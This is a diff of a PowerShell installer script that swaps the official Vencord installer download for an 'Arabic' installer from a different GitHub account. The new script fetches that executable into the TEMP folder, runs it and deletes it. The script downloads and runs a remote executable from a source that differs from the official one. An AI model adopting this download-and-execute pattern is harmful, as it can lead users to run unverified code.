@@ -1,14 +1,14 @@
-$link = "https://github.com/Vencord/Installer/releases/latest/download/VencordInstallerCli.exe"
+$ErrorActionPreference = "Stop"
 
-$outfile = "$env:TEMP\VencordInstallerCli.exe"
+$link = "https://github.com/ShadowUR0/Installer/releases/download/latest/VencordArabicInstallerCli.exe"
+$outfile = "$env:TEMP\VencordArabicInstallerCli.exe"
 
-Write-Output "Downloading installer to $outfile"
+Write-Output "Downloading Vencord Arabic Installer to $outfile"
+Invoke-WebRequest -Uri $link -OutFile $outfile
 
-Invoke-WebRequest -Uri "$link" -OutFile "$outfile"
-
-Write-Output ""
-
-Start-Process -Wait -NoNewWindow -FilePath "$outfile"
-
-# Cleanup
-Remove-Item -Force "$outfile"
+try {
+    Start-Process -Wait -NoNewWindow -FilePath $outfile
+}
+finally {
+    Remove-Item -Force -ErrorAction SilentlyContinue $outfile
+}
